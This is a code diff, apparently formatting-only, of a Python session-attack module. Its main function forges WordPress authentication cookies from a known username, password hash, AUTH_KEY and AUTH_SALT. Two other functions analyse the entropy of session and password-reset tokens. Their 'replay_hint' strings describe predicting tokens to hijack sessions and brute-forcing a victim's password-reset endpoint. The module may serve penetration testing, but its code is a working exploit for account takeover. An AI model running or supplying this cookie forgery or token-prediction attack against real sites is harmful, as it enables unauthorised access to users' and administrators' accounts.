@@ -58,11 +58,11 @@ class SessionFinding:
 
     def to_dict(self):
         return {
-            "technique":    self.technique,
-            "severity":     self.severity,
-            "evidence":     self.evidence,
-            "replay_hint":  self.replay_hint,
-            "metadata":     dict(self.metadata),
+            "technique": self.technique,
+            "severity": self.severity,
+            "evidence": self.evidence,
+            "replay_hint": self.replay_hint,
+            "metadata": dict(self.metadata),
         }
 
 
@@ -74,7 +74,7 @@ class SessionReport:
     def to_dict(self):
         return {
             "findings": [f.to_dict() for f in self.findings],
-            "errors":   list(self.errors),
+            "errors": list(self.errors),
         }
 
 
@@ -87,13 +87,15 @@ def _wp_hash(data: str, key: str, algo: str = "sha256") -> str:
     return hmac.new(key.encode("utf-8"), data.encode("utf-8"), algo).hexdigest()
 
 
-def forge_wp_auth_cookie(username: str,
-                          password_hash: str,
-                          auth_key: str,
-                          auth_salt: str,
-                          scheme: str = "logged_in",
-                          expiration: Optional[int] = None,
-                          token: str = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789") -> SessionFinding:
+def forge_wp_auth_cookie(
+    username: str,
+    password_hash: str,
+    auth_key: str,
+    auth_salt: str,
+    scheme: str = "logged_in",
+    expiration: Optional[int] = None,
+    token: str = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789",
+) -> SessionFinding:
     """Forge a WP auth cookie.
 
     Logic matches wp_generate_auth_cookie() in wp-includes/pluggable.php:
@@ -113,11 +115,13 @@ def forge_wp_auth_cookie(username: str,
     inner_key_input = f"{username}|{pass_frag}|{expiration}|{token}"
     # key = wp_hash(inner_key_input, scheme) with scheme_key = AUTH_KEY + AUTH_SALT
     scheme_key = auth_key + auth_salt
-    key = hmac.new(scheme_key.encode("utf-8"), inner_key_input.encode("utf-8"),
-                   hashlib.md5).hexdigest()
+    key = hmac.new(
+        scheme_key.encode("utf-8"), inner_key_input.encode("utf-8"), hashlib.md5
+    ).hexdigest()
     outer_input = f"{username}|{expiration}|{token}"
-    cookie_hash = hmac.new(key.encode("utf-8"), outer_input.encode("utf-8"),
-                            hashlib.sha256).hexdigest()
+    cookie_hash = hmac.new(
+        key.encode("utf-8"), outer_input.encode("utf-8"), hashlib.sha256
+    ).hexdigest()
     cookie = f"{username}|{expiration}|{token}|{cookie_hash}"
     return SessionFinding(
         technique=f"wp_cookie_forge_{scheme}",
@@ -132,8 +136,8 @@ def forge_wp_auth_cookie(username: str,
         ),
         metadata={
             "cookie_value": cookie,
-            "scheme":       scheme,
-            "expiration":   expiration,
+            "scheme": scheme,
+            "expiration": expiration,
             "token_prefix": token[:16],
         },
     )
@@ -170,8 +174,9 @@ def analyze_session_entropy(tokens: List[str]) -> SessionFinding:
       - two tokens share >70% of chars  → possibly derived from seed+counter
     """
     if not tokens:
-        return SessionFinding(technique="session_entropy", severity="info",
-                              evidence="no tokens supplied")
+        return SessionFinding(
+            technique="session_entropy", severity="info", evidence="no tokens supplied"
+        )
     ents = [_shannon_entropy_bits(t) for t in tokens]
     mean_ent = sum(ents) / len(ents)
     weak = mean_ent < 3.5
@@ -200,14 +205,19 @@ def analyze_session_entropy(tokens: List[str]) -> SessionFinding:
     if similar_pairs:
         ev += f"; {len(similar_pairs)} token pairs share >40% common prefix"
     return SessionFinding(
-        technique="session_entropy", severity=severity, evidence=ev,
+        technique="session_entropy",
+        severity=severity,
+        evidence=ev,
         replay_hint=(
             "Harvest a sequence of tokens (register N burner accounts). "
-            "If entropy low, predict next token and hijack session." if weak
+            "If entropy low, predict next token and hijack session."
+            if weak
             else "Sample larger; current sample too small to conclude."
         ),
-        metadata={"mean_entropy_bits_per_char": mean_ent,
-                  "similar_pairs": similar_pairs[:5]},
+        metadata={
+            "mean_entropy_bits_per_char": mean_ent,
+            "similar_pairs": similar_pairs[:5],
+        },
     )
 
 
@@ -220,8 +230,11 @@ def analyze_reset_tokens(tokens_with_timestamps: List[tuple]) -> SessionFinding:
         lexicographically (= they're derived from time())
     """
     if not tokens_with_timestamps:
-        return SessionFinding(technique="reset_token_entropy", severity="info",
-                              evidence="no reset tokens supplied")
+        return SessionFinding(
+            technique="reset_token_entropy",
+            severity="info",
+            evidence="no reset tokens supplied",
+        )
     tokens_with_timestamps = sorted(tokens_with_timestamps, key=lambda x: x[1])
     leaks: List[str] = []
     for tok, ts in tokens_with_timestamps:
@@ -243,11 +256,14 @@ def analyze_reset_tokens(tokens_with_timestamps: List[tuple]) -> SessionFinding:
     if monotonic:
         ev += "; tokens monotonically sorted by timestamp (derived from time())"
     return SessionFinding(
-        technique="reset_token_entropy", severity=sev, evidence=ev,
+        technique="reset_token_entropy",
+        severity=sev,
+        evidence=ev,
         replay_hint=(
             "Issue reset request for victim email around a known timestamp; "
             "compute candidate tokens; hit endpoint with each until success."
-            if weak else "Token generation appears random; move on."
+            if weak
+            else "Token generation appears random; move on."
         ),
         metadata={"leaks": leaks, "monotonic": monotonic},
     )
@@ -256,9 +272,11 @@ def analyze_reset_tokens(tokens_with_timestamps: List[tuple]) -> SessionFinding:
 # ── Scan orchestrator ─────────────────────────────────────────────
 
 
-def scan_sessions(observed_session_tokens: Optional[List[str]] = None,
-                   observed_reset_tokens: Optional[List[tuple]] = None,
-                   wp_forge: Optional[Dict[str, Any]] = None) -> SessionReport:
+def scan_sessions(
+    observed_session_tokens: Optional[List[str]] = None,
+    observed_reset_tokens: Optional[List[tuple]] = None,
+    wp_forge: Optional[Dict[str, Any]] = None,
+) -> SessionReport:
     """Run all applicable session-level checks in one pass.
 
     wp_forge, if provided, should contain at minimum:
@@ -272,15 +290,17 @@ def scan_sessions(observed_session_tokens: Optional[List[str]] = None,
         report.findings.append(analyze_reset_tokens(observed_reset_tokens))
     if wp_forge:
         try:
-            report.findings.append(forge_wp_auth_cookie(
-                username=wp_forge["username"],
-                password_hash=wp_forge["password_hash"],
-                auth_key=wp_forge["auth_key"],
-                auth_salt=wp_forge["auth_salt"],
-                scheme=wp_forge.get("scheme", "logged_in"),
-                expiration=wp_forge.get("expiration"),
-                token=wp_forge.get("token", "a" * 64),
-            ))
+            report.findings.append(
+                forge_wp_auth_cookie(
+                    username=wp_forge["username"],
+                    password_hash=wp_forge["password_hash"],
+                    auth_key=wp_forge["auth_key"],
+                    auth_salt=wp_forge["auth_salt"],
+                    scheme=wp_forge.get("scheme", "logged_in"),
+                    expiration=wp_forge.get("expiration"),
+                    token=wp_forge.get("token", "a" * 64),
+                )
+            )
         except KeyError as exc:
             report.errors.append(f"wp_forge missing key: {exc}")
         except Exception as exc:  # noqa: BLE001
@@ -289,7 +309,8 @@ def scan_sessions(observed_session_tokens: Optional[List[str]] = None,
 
 
 __all__ = [
-    "SessionFinding", "SessionReport",
+    "SessionFinding",
+    "SessionReport",
     "forge_wp_auth_cookie",
     "analyze_session_entropy",
     "analyze_reset_tokens",
